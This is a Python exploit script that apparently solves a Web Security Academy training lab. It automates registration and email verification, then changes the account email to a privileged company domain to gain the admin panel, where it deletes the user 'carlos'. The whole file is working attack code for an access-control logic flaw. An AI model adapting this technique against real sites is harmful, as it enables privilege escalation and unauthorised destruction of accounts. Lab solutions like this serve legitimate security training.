import sys
import requests
from bs4 import BeautifulSoup



def extract_csrf_token(response):
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    return csrf_token


def get_email_client_url(url, session):
    response = session.get(url, timeout=10)
    soup = BeautifulSoup(response.text, "html.parser")
    email_client_url = soup.find("a", {"id": "exploit-link"}).get("href")
    return email_client_url


def register_account(url, session):
    # Registering account
    response = session.get(f"{url}/register", timeout=10)
    if response.status_code == 200:
        csrf_token = extract_csrf_token(response)
        email_client_url = get_email_client_url(url, session)
        email_address = f"bob@{email_client_url}".replace("/email", "").replace("https://", "")
        session.post(f"{url}/register", data={"csrf": csrf_token, "username": "bob", "email": email_address, "password": "bob"})

        #Verifying email address
        email_client_response = session.get(email_client_url, timeout=10)
        soup = BeautifulSoup(email_client_response.text, 'html.parser')
        verification_link = soup.find('pre').find('a')['href']
        verification_response = session.get(verification_link, timeout=10)
        return "Account registration successful!" in verification_response.text


def login(url, session):
    response = session.get(f"{url}/login", timeout=10)
    csrf_token = extract_csrf_token(response)
    session.post(f"{url}/login", data={"csrf": csrf_token, "username": "bob", "password": "bob"}, timeout=10)


def exploit_vuln(url, session):
    #changing account email address
    response = session.get(f"{url}/my-account", timeout=10)
    csrf_token = extract_csrf_token(response)
    session.post(f"{url}/my-account/change-email", data={"email": "bob@dontwannacry.com", "csrf": csrf_token}, timeout=10)

    #Accessing admin panel and deleting user carlos
    delete_user_response = session.get(f"{url}/admin/delete?username=carlos")
    return "User deleted successfully!" in delete_user_response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Registering Account...")
        if not register_account(url, session):
            print("(-) Something went wrong. Please check your URL and try again.")
            sys.exit(1)

        print("(+) Logging in...")
        login(url, session)

        print("(+) Deleting the user \"carlos\"...")
        if exploit_vuln(url, session):
            print("(+) Lab completed successfully!")
        else:
            print("(-) Something went wrong.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")

    except KeyboardInterrupt:
        sys.exit(1)


if __name__ == "__main__":
    main()